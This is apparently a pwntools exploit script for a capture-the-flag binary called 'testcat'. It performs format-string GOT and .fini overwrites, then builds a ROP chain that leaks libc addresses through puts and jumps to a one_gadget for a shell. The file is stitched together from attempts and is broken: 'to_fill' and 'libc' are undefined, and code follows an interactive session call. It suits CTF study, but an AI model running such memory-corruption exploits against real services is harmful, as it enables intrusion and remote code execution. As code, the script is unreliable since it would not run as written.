from pwn import *

context.binary = elf = ELF('testcat')
context.log_level = 'debug'
io = remote('chals.cyberthon22f.ctf.sg', 10401)

printf_got = elf.got['printf']
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main = elf.symbols['main']

fini = 0x401380

# payload = b'%p ' * (0x110//3 - 1)
offset = 6
payload = fmtstr_payload(6, {fini: main}, write_size='long')
io.sendline(payload)
payload = fmtstr_payload(6, {puts_got: main}, write_size='long')
io.sendline(payload)
io.interactive()







# Manual way

# POP_RDI = 0x4007e3
# payload = b'A' * to_fill + p64(POP_RDI) + p64(printf_got) + p64(puts_plt) + p64(main)  # Manual way: calls puts(printf_got) to leak address of printf in the GOT then return to main to allow input again

# Automatic way
rop = ROP(elf)
rop.puts(elf.got.printf)
rop.puts(elf.got.puts)
rop.main()
payload = b'A' * to_fill + rop.chain()  # Automatic way using rop chain, both works


io.recvuntil(b'=> ')
io.sendline(payload)
io.recvuntil(b'RECEIVED:')
leak = u64(io.recvline().strip().ljust(8, b'\x00'))
print('printf leak:', hex(leak))
print('puts leak:', hex(leak))
io.interactive()
libc_printf_offset = libc.symbols['printf']
# libc_system_offset = libc.symbols['system']
# BIN_SH_offset_searched = next(libc.search(b"/bin/sh"))
ONE_GADGET = 0x10a2fc  # found using one_gadget libc.so.6
# print(hex(BIN_SH_offset_searched))

libc_base = leak - libc_printf_offset
# libc_system = libc_base + libc_system_offset
# libc_BIN_SH = libc_base + BIN_SH_offset_searched
libc_one_gadget = libc_base + ONE_GADGET
# print('system:', hex(libc_system))
# print('binsh:', hex(libc_BIN_SH))

# payload = b'A' * to_fill + p64(POP_RDI) + p64(libc_BIN_SH) + p64(ret) + p64(libc_system)  # dont work due to space in payload
payload = b'A' * to_fill + p64(libc_one_gadget)  # return directly to libc onegadget
io.recvuntil(b'Enter Input =>')
io.sendline(payload)
io.interactive()